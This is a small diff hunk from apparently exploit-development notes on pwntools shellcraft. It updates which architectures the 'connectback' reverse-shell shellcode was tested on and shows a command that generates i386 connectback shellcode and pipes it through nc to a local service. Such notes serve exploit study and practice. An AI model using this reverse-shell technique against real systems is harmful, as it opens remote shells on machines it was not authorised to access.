@@ -76,8 +76,8 @@ print s.recvall()
 ```
 
 ### connectback
-* tested on i386
-* amd64(unstable), thumb(didn't work)
-* have to write shellcode in ARM
+* tested on i386, thumb
+* amd64(unstable)
+* arm - arm_to_thumb() + connectback() 
 
 ``shellcraft -c i386 connectback localhost 31338 3 -f r | nc localhost 31337``
